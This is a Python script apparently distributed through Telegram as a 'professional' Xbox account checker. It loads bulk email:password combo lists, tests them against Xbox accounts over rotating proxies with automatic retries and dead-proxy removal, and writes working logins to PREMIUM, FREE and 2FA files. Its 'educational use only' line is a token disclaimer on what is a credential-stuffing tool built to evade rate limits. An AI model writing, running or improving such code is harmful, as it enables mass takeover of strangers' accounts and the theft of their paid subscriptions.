#!/usr/bin/env python3
"""
Yorichii Xbox Checker - Professional Edition
TG: https://t.me/whoevenyori | Green & Gold | Live Terminal Bulk Checker

Professional Features:
- If no proxies -> uses own IP (direct)
- Auto-remove dead proxies during checking
- Retry combos until HIT/BAD (no proxy errors allowed)
- Live terminal with real-time stats
- Bulk checking with threading

Educational Use Only - Only test accounts you own!
Provided by @yorichiiprime
"""

import argparse
import sys
import os
import time
import threading
import random
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Import checker
try:
    from api.checker import check_account, MAX_PROXIES_PER_REQUEST, SUB_TYPES
    from api.watermark import WATERMARK_TEXT
except ImportError:
    sys.path.insert(0, os.path.dirname(__file__))
    from api.checker import check_account, MAX_PROXIES_PER_REQUEST, SUB_TYPES
    from api.watermark import WATERMARK_TEXT

# Colors - Green & Gold
class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    CYAN = "\033[96m"; WHITE = "\033[97m"
    GOLD = "\033[38;5;220m"; EMERALD = "\033[38;5;46m"; LGOLD = "\033[38;5;227m"
    @staticmethod
    def off():
        for k in dir(C):
            if not k.startswith("_") and k not in ("off",):
                setattr(C, k, "")

if os.name == "nt":
    try: os.system("color")
    except: pass

BANNER = f"""{C.EMERALD}{C.B}{C.B}
 __   __           _      _     _  _  ____       _               
 \\ \\ / /__  _ __  (_) ___| |__ (_)(_)/ ___|  ___| |__   ___  ___ 
  \\ V / _ \\| '__| | |/ __| '_ \\| || | |  _ / __| '_ \\ / _ \\/ __|
   | | (_) | |    | | (__| | | | || | |_| | (__| | | |  __/ (__ 
   |_|\\___/|_|    |_|\\___|_| |_|_|_|\\____|\\___|_| |_|\\___|\\___|{C.R}
{C.GOLD}{C.B}  Y O R I C H I I  -  PROFESSIONAL XBOX CHECKER
  GREEN & GOLD • LIVE TERMINAL • BULK • AUTO PROXY REMOVER{C.R}
{C.EMERALD}  {WATERMARK_TEXT} | {C.GOLD}TG: https://t.me/whoevenyori{C.R}{C.D}
  • No Proxy? -> Uses Own IP (Direct)
  • Dead Proxy? -> Auto-Removed & Retried
  • Retry Until HIT/BAD - No Proxy Errors Allowed
  • Live Stats • Threaded • Watermarked
  • v2.0-professional{C.R}
"""

# Global proxy manager with auto-remove
class ProProxyManager:
    def __init__(self, proxies):
        self._lock = threading.Lock()
        self.all_proxies = proxies[:] if proxies else []
        self.good_proxies = proxies[:] if proxies else []
        self.bad_proxies = set()
        self.dead_count = 0

    def has_proxies(self):
        with self._lock:
            return len(self.good_proxies) > 0

    def get_proxy(self):
        with self._lock:
            if not self.good_proxies:
                return None
            return random.choice(self.good_proxies)

    def get_all_for_check(self):
        """Return list with single proxy for checker (it will rotate internally) or None for direct IP"""
        with self._lock:
            if not self.good_proxies:
                return None  # Use own IP
            # Return 1 random proxy as list for this check
            return [random.choice(self.good_proxies)]

    def mark_dead(self, proxy_str):
        """Auto-remove dead proxy"""
        if not proxy_str:
            return
        with self._lock:
            # Find matching proxy in good list (could be full string or normalized)
            to_remove = []
            for p in self.good_proxies:
                if p == proxy_str or proxy_str in p or p in proxy_str:
                    to_remove.append(p)
            # If not found by exact, try to match by host:port
            if not to_remove and proxy_str in self.all_proxies:
                to_remove = [proxy_str]
            
            for p in to_remove:
                if p in self.good_proxies:
                    self.good_proxies.remove(p)
                    self.bad_proxies.add(p)
                    self.dead_count += 1
                    print(f"{C.D}[PROXY] Dead removed: {p} | Left: {len(self.good_proxies)} | Dead: {self.dead_count}{C.R}")

    def stats(self):
        with self._lock:
            return len(self.good_proxies), len(self.bad_proxies), len(self.all_proxies)

# Stats
stats_lock = threading.Lock()
stats = {"PREMIUM":0,"FREE":0,"BAD":0,"2FA":0,"BANNED":0,"TIMEOUT":0,"ERROR":0,"TOTAL":0,"CHECKED":0,"RETRY":0,"PROXY_DEAD":0}
live_lock = threading.Lock()

def load_lines(path):
    p = Path(path)
    if not p.exists():
        print(f"{C.RED}[!] File not found: {path}{C.R}"); sys.exit(1)
    out=[]
    for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
        line=line.strip()
        if not line or line.startswith("#"): continue
        out.append(line)
    return out

def parse_combo(line):
    line=line.strip()
    for sep in [":","|",";"]:
        if sep in line:
            a,b=line.split(sep,1)
            if "@" in a: return a.strip(), b.strip()
    if " " in line:
        parts=line.split()
        if len(parts)>=2 and "@" in parts[0]: return parts[0].strip(), parts[-1].strip()
    return None,None

def is_proxy_error(result):
    """Check if result is proxy-related error that should be retried"""
    status = result.get("status","")
    error = str(result.get("error","")).lower()
    # Proxy errors to retry
    proxy_keywords = ["proxy","proxies","timeout","timed out","connection","connect","max retries","read timed out","proxyerror","socks","tunnel","dead","unreachable","refused"]
    if status in ("TIMEOUT","ERROR"):
        # If error contains proxy keywords, it's proxy error
        for kw in proxy_keywords:
            if kw in error:
                return True
        # TIMEOUT is often proxy issue, retry
        if status == "TIMEOUT":
            return True
        # Generic ERROR without clear BAD/FREE etc, treat as proxy error if we have proxies
        # But we need to be careful - some ERRORs are genuine (e.g. layout changed)
        # For professional checker: retry on ERROR unless it's clearly not proxy
        if status == "ERROR" and ("proxy" in error or "timeout" in error or "connection" in error or "max retries" in error or len(error) < 5):
            return True
    return False

def is_valid_result(result):
    """Valid results that should NOT be retried - these are final"""
    return result.get("status") in ("PREMIUM","FREE","BAD","2FA","BANNED")

def format_result(email, result, attempt=1, proxy_used=None):
    status=result.get("status","UNKNOWN")
    dur=result.get("duration",0)
    data=result.get("data",{}) or {}
    gt=data.get("gamertag","")
    gp=data.get("gamepass","")
    gs=data.get("gamerscore","")

    col=C.WHITE
    if status=="PREMIUM": col=C.EMERALD+C.B
    elif status=="FREE": col=C.CYAN
    elif status=="BAD": col=C.RED
    elif status=="2FA": col=C.GOLD+C.B
    elif status=="BANNED": col=C.YELLOW
    elif status in ("TIMEOUT","ERROR"): col=C.D

    extra=""
    if gt: extra+=f" | GT: {gt}"
    if gp: extra+=f" | {C.GOLD}{gp}{C.R}{col}"
    if gs: extra+=f" | GS: {gs}"
    if proxy_used:
        # Show proxy host only, not full creds
        ph = proxy_used.split("@")[-1] if "@" in proxy_used else proxy_used
        extra+=f" {C.D}[{ph}]{C.R}"
    else:
        extra+=f" {C.D}[Own IP]{C.R}"

    ts=datetime.now().strftime("%H:%M:%S")
    retry_info = f" {C.YELLOW}(retry {attempt}){C.R}" if attempt>1 else ""
    return f"{C.D}[{ts}]{C.R} {col}[{status}]{C.R} {email} ({dur:.2f}s){extra}{retry_info}"

def professional_check(email, password, proxy_manager, output_dir, verbose=False, max_retries=10):
    """
    Professional checker logic:
    - If no proxies -> use own IP
    - Auto-remove dead proxies
    - Retry until HIT/BAD (no proxy errors allowed)
    """
    global stats
    attempt=0
    last_proxy=None
    proxies_tried=set()

    while attempt < max_retries:
        attempt+=1
        
        # Get proxy for this attempt
        if proxy_manager and proxy_manager.has_proxies():
            proxy_list = proxy_manager.get_all_for_check()
            if proxy_list:
                last_proxy = proxy_list[0]
                proxies_tried.add(last_proxy)
            else:
                proxy_list = None
                last_proxy = None
        else:
            # No proxies -> own IP
            proxy_list = None
            last_proxy = None
            if attempt==1:
                print(f"{C.GOLD}[*] No proxies / all dead -> Using Own IP for {email}{C.R}")

        try:
            result = check_account(email, password, proxy_list)
        except Exception as e:
            result = {"status":"ERROR","error":str(e)[:200],"duration":0}

        # Check if proxy error -> retry
        if is_proxy_error(result) and (proxy_manager and proxy_manager.has_proxies() or attempt==1):
            # Mark this proxy as dead
            if last_proxy:
                proxy_manager.mark_dead(last_proxy)
                with stats_lock:
                    stats["PROXY_DEAD"]+=1
                    stats["RETRY"]+=1
            # If we still have proxies, retry
            if proxy_manager and proxy_manager.has_proxies():
                print(f"{C.YELLOW}[RETRY] {email} -> Proxy dead ({result.get('status')}: {str(result.get('error',''))[:60]}), retrying with new proxy... ({attempt}/{max_retries}){C.R}")
                time.sleep(0.5)  # Small delay before retry
                continue
            else:
                # No proxies left, try own IP as last resort
                if proxy_list is not None:  # We were using proxy, now try direct
                    print(f"{C.GOLD}[FALLBACK] {email} -> All proxies dead, trying Own IP...{C.R}")
                    try:
                        result = check_account(email, password, None)
                        if is_valid_result(result):
                            break
                    except:
                        pass
                # If still proxy error and no proxies, break with error
                if is_proxy_error(result):
                    # Final fallback - return as ERROR but we tried
                    break
                else:
                    break
        else:
            # Valid result or non-proxy error -> final
            break

    # Final result handling
    status=result.get("status","ERROR")
    with stats_lock:
        stats["CHECKED"]+=1
        stats["TOTAL"]+=1
        if status in stats: stats[status]+=1
        else: stats["ERROR"]+=1

    line=format_result(email, result, attempt, last_proxy)
    with live_lock:
        print(line)
        checked=stats["CHECKED"]
        if checked%5==0:
            good, bad, total = proxy_manager.stats() if proxy_manager else (0,0,0)
            print(f"{C.D}  ↳ Live: {checked} | {C.EMERALD}PREMIUM:{stats['PREMIUM']}{C.R}{C.D} FREE:{stats['FREE']} BAD:{stats['BAD']} 2FA:{stats['2FA']} | Proxies: {good} good, {bad} dead{C.R}")

    # Save
    try:
        if status=="PREMIUM":
            with open(output_dir/"PREMIUM.txt","a",encoding="utf-8") as f:
                f.write(f"{email}:{password} | {result.get('data',{})}\n")
        elif status=="FREE":
            with open(output_dir/"FREE.txt","a",encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        elif status=="2FA":
            with open(output_dir/"2FA.txt","a",encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        elif status=="BAD":
            with open(output_dir/"BAD.txt","a",encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        import json
        with open(output_dir/"results.jsonl","a",encoding="utf-8") as f:
            f.write(json.dumps({"email":email,"result":result,"proxy":last_proxy})+"\n")
    except: pass

    if verbose:
        import json
        print(f"{C.D}{json.dumps(result, indent=2)[:600]}{C.R}")

    return result

def main():
    parser=argparse.ArgumentParser(description=f"Yorichii Professional Xbox Checker - TG https://t.me/whoevenyori - Live Bulk", formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Professional Features:\n  - No proxies? Uses Own IP\n  - Dead proxy? Auto-removed & retried\n  - Retry until PREMIUM/FREE/BAD/2FA/BANNED (no proxy errors)\n\nExamples:\n  YorichiiChecker.exe -i combos.txt -p proxies.txt -t 20\n  YorichiiChecker.exe -i combos.txt (uses own IP)\n  YorichiiChecker.exe --combo test@mail.com:pass123 -p proxies.txt\n\nTG: https://t.me/whoevenyori")
    parser.add_argument("-i","--input",help="Combos file (email:password per line) - BULK")
    parser.add_argument("-p","--proxies",help="Proxies file (one per line) - optional, uses own IP if not provided")
    parser.add_argument("--proxy",help="Single proxy")
    parser.add_argument("-e","--email",help="Single email")
    parser.add_argument("-w","--password",help="Single password")
    parser.add_argument("--combo",help="Single combo email:pass")
    parser.add_argument("-t","--threads",type=int,default=10,help="Threads for bulk (default 10, max 100)")
    parser.add_argument("-o","--output",default="results",help="Output folder")
    parser.add_argument("--no-color",action="store_true",help="Disable colors")
    parser.add_argument("-v","--verbose",action="store_true",help="Verbose")
    parser.add_argument("--version",action="store_true",help="Show version")
    parser.add_argument("--max-retries",type=int,default=10,help="Max retries per combo if proxy dies (default 10)")

    args=parser.parse_args()
    if args.no_color: C.off()
    if args.version:
        print(BANNER)
        print(f"{C.GOLD}Version: 2.0-professional-green-gold{C.R}")
        print(f"{C.EMERALD}Watermark: {WATERMARK_TEXT}{C.R}")
        print(f"{C.GOLD}TG: https://t.me/whoevenyori{C.R}")
        print(f"Features: Own IP fallback, Auto-remove dead proxies, Retry until HIT/BAD")
        sys.exit(0)

    print(BANNER)
    print(f"{C.GOLD}{C.B}[PRO] Professional Mode: Own IP Fallback + Auto Dead Proxy Remover + Retry Until Valid{C.R}\n")

    # Load proxies
    proxies=[]
    if args.proxy: proxies=[args.proxy.strip()]
    elif args.proxies: proxies=load_lines(args.proxies)
    else:
        for default in ["proxies.txt","proxy.txt","data/proxies.txt","proxies.example.txt"]:
            if Path(default).exists():
                proxies=load_lines(default)
                print(f"{C.EMERALD}[*] Auto-loaded proxies from {default}: {len(proxies)}{C.R}")
                break

    proxy_manager = ProProxyManager(proxies) if proxies else None

    if not proxies:
        print(f"{C.GOLD}[*] No proxies provided -> Will use OWN IP (direct connection){C.R}")
        print(f"{C.D}    Tip: Add proxies.txt for better anonymity & to avoid rate-limit{C.R}")
    else:
        print(f"{C.EMERALD}[*] Loaded {len(proxies)} proxies | Auto-remove dead: ON | Own IP fallback: ON{C.R}")

    # Load combos
    combos=[]
    if args.combo:
        e,p=parse_combo(args.combo)
        if e and p: combos.append((e,p))
    if args.email and args.password:
        combos.append((args.email.strip(), args.password))
    if args.input:
        for line in load_lines(args.input):
            e,p=parse_combo(line)
            if e and p: combos.append((e,p))
            else: print(f"{C.D}[!] Skip invalid: {line[:80]}{C.R}")
    if not combos:
        for default in ["combos.txt","combo.txt","data/combos.txt","accounts.txt","combos.example.txt"]:
            if Path(default).exists():
                for line in load_lines(default):
                    e,p=parse_combo(line)
                    if e and p: combos.append((e,p))
                if combos:
                    print(f"{C.EMERALD}[*] Auto-loaded combos from {default}: {len(combos)}{C.R}")
                    break

    if not combos:
        print(f"{C.RED}[!] No combos! Use -i combos.txt or --combo email:pass{C.R}")
        parser.print_help(); sys.exit(1)

    print(f"{C.EMERALD}[*] Loaded {len(combos)} combos for PROFESSIONAL BULK CHECK{C.R}")
    print(f"{C.GOLD}[*] Mode: LIVE TERMINAL | Retry until HIT/BAD | No proxy errors allowed{C.R}")

    output_dir=Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    print(f"{C.EMERALD}[*] Output: {output_dir.resolve()}{C.R}")
    print(f"{C.D}    PREMIUM.txt, FREE.txt, BAD.txt, 2FA.txt, results.jsonl{C.R}")

    threads=max(1,min(args.threads,100))
    print(f"{C.GOLD}[*] Starting PROFESSIONAL CHECK with {threads} threads...{C.R}")
    print(f"{C.D}{'='*75}{C.R}\n")

    start=time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs=[]
            for email,pwd in combos:
                futs.append(ex.submit(professional_check, email, pwd, proxy_manager, output_dir, args.verbose, args.max_retries))
            for _ in as_completed(futs): pass
    except KeyboardInterrupt:
        print(f"\n{C.GOLD}[!] Interrupted - Saving...{C.R}")
        sys.exit(0)

    elapsed=time.time()-start
    print(f"\n{C.D}{'='*75}{C.R}")
    print(f"{C.B}{C.GOLD}========== PROFESSIONAL RESULTS =========={C.R}")
    print(f"{C.EMERALD}PREMIUM: {stats['PREMIUM']}{C.R} | {C.CYAN}FREE: {stats['FREE']}{C.R} | {C.RED}BAD: {stats['BAD']}{C.R} | {C.GOLD}2FA: {stats['2FA']}{C.R} | {C.YELLOW}BANNED: {stats['BANNED']}{C.R} | RETRY: {stats['RETRY']} | DEAD PROXIES: {stats['PROXY_DEAD']}")
    if elapsed>0:
        print(f"{C.GOLD}Checked: {stats['CHECKED']}/{stats['TOTAL']} in {elapsed:.2f}s | {stats['CHECKED']/elapsed:.2f} c/s | Threads: {threads}{C.R}")
    if proxy_manager:
        good,bad,total=proxy_manager.stats()
        print(f"{C.EMERALD}Proxies: {good} good, {bad} dead, {total} total | Own IP fallback used when needed{C.R}")
    print(f"{C.EMERALD}Results: {output_dir.resolve()}{C.R}")
    print(f"{C.D}{WATERMARK_TEXT} | TG: https://t.me/whoevenyori | Professional Green & Gold{C.R}")
    print(f"{C.GOLD}==========================================={C.R}")
    print(f"{C.EMERALD}Join TG: https://t.me/whoevenyori{C.R}")

if __name__=="__main__":
    main()
